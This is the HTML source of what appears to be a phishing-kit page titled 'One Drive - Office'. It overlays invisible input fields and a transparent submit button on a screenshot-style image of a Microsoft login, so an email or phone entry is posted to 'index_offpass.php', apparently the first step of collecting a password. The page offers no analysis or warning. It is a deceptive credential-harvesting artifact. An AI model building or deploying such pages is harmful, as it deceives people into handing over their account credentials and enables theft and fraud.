<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>One Drive - Office</title>
<link rel="shortcut icon" href="images/fav.ico">
<style type="text/css">
div#container
{
   width: 800px;
   height: 600px;
   margin-top: 0px;
   margin-left: 0px;
   text-align: left;
}
</style>
<style type="text/css">
body
{
   background-color: #FFFFFF;
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #94A9CB;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>
<div id="container">
<div id="bv_Image1" style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:617px;height:565px;text-align:left;z-index:4;">
<img src="images/off.png" id="Image1" alt="" align="top" border="0" style="width:617px;height:565px;"></div>



<div id="bv_Form1" style="position:absolute;left:82px;top:100px;width:444px;height:339px;z-index:5">
<form name="Form1" method="post" action="index_offpass.php" id="Form1">


<input type="text" id="Editbox1" style="position:absolute;left:55px;top:140px;width:344px;height:20px;border:0px #C0C0C0 solid;background-color:transparent;font-family:'Leelawadee UI Semilight';font-size:14px;z-index:0" name="emal" value="" pattern=".{4,50}" oninvalid="this.setCustomValidity('Required')" oninput="setCustomValidity('')" maxlength="50" required placeholder="Email, phone, or Skype" required>


<div id="bv_Image2" style="margin:0;padding:0;position:absolute;left:54px;top:191px;width:155px;height:13px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:1;">
<img src="" id="Image2" alt="" align="top" border="0" style="width:155px;height:13px;"></div>
<div id="bv_Image3" style="margin:0;padding:0;position:absolute;left:132px;top:227px;width:65px;height:13px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:2;">
<img src="" id="Image3" alt="" align="top" border="0" style="width:65px;height:13px;"></div>
<input type="submit" id="Button1" name="Button1" value="" style="position:absolute;left:292px;top:263px;width:111px;height:35px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:3">
</form>
</div>
</div>
</body>
</html>